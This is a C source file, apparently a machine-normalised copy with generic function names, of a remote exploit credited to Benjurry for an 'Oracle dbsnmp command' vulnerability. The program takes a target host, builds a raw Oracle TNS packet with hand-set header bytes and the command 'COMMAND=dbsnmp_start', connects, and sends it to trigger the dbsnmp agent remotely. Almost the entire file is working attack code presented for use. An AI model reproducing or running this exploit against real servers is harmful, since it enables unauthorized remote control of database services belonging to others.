#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct in_addr {int dummy; } ;
struct sockaddr_in {struct in_addr sin_addr; int /*<<< orphan*/  sin_family; int /*<<< orphan*/  sin_port; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef  int /*<<< orphan*/  server ;
typedef  int /*<<< orphan*/  head ;
typedef  int /*<<< orphan*/  cmd2 ;
typedef  int /*<<< orphan*/  cmd1 ;
typedef  int /*<<< orphan*/  WSADATA ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int FUNC0 () ; 
 int /*<<< orphan*/  FUNC1 (int,int) ; 
 int /*<<< orphan*/  PORT ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 () ; 
 int FUNC4 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int FUNC6 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC7 (int) ; 
 struct hostent* FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC11 (char*,...) ; 
 int FUNC12 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC13 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 

int FUNC14(int argc, char *argv[])
{


		char cmd1[]="(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=)(HOST=)(USER=))(COMMAND=dbsnmp_start)";
		char cmd2[]="(VERSION=1)))";
		char head[]="\x00\x59\x00\x00\x01\x00\x00\x00\x01\x36"
			"\x01\x2c\x00\x00\x08\x00\x7f\xff\x7f\x08\x00\x00\x00\x01"
			"\x00\x1f\x00\x3a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x34\xe6\x00\x00\x00\x01\x00\x00"
			"\x00\x00\x00\x00\x00\x00";

		char buffer2[200];
		int ret;
	int packetlength;
	int cmdlength;
	int tt;

	WSADATA WSAData;
	struct hostent          *ht;
	struct sockaddr_in      server;

	FUNC11("Oracle dbsnmp command Remote Vulnerability discoveried by Benjurry\n");
	FUNC11("Code by benjurry,benjurry@263.net\n");
	FUNC11("www.xfocus.org  www.benjurry.org\n");
	if(argc<2)
	{
		FUNC11("useage:%s target\n",argv[0]);
FUNC7(1);
	}
	 tt=sizeof(head);

	packetlength=58+sizeof(cmd1)+sizeof(cmd2)-2;


	cmdlength=sizeof(cmd1)+sizeof(cmd2)-2;

	FUNC10(buffer2,head,sizeof(head)-1);
	FUNC10(buffer2+sizeof(head)-1,cmd1,sizeof(cmd1)-1);
	FUNC10(buffer2+sizeof(head)-1+sizeof(cmd1)-1,cmd2,sizeof(cmd2));

	
  
	buffer2[0]=packetlength>> 8;
	buffer2[1]=packetlength & 0xff;
	buffer2[24]=cmdlength>>8;
	buffer2[25]=cmdlength& 0xff;


	


if((tt=FUNC4(FUNC1(1,1), &WSAData)) != 0)
        {
                FUNC11("WSAStartup failed.\n");
				tt=FUNC0();
                FUNC3();
                FUNC7(1);
        }
if((ht = FUNC8(argv[1]))==0)
{
                FUNC11("Unable to resolve host %s\n",argv[1]);
                FUNC7(1);
        } 
server.sin_port = FUNC9(PORT);
server.sin_family=AF_INET;
server.sin_addr=*((struct in_addr *)ht->h_addr);
   if((ret = FUNC13(AF_INET, SOCK_STREAM, 0)) == -1)
        {
                FUNC11("Unable to set up socket\n");
                FUNC7(1);
        }   

if((FUNC6(ret, (struct sockaddr *) &server, sizeof(server))) == -1)
        {
                FUNC11("Unable to connect\n");
                FUNC7(1);
        }
        else
                FUNC11("Connected.\n");
		//if(send(ret, tnsping, 100, 0) == -1)

		if(FUNC12(ret, buffer2, packetlength, 0) == -1)
        {
                FUNC11("Unable to send\n");
                FUNC7(1);
        }
        else
        {
                FUNC11("code sented...\n");
                
        }
FUNC2(1000);
FUNC5(ret);
return 0;


}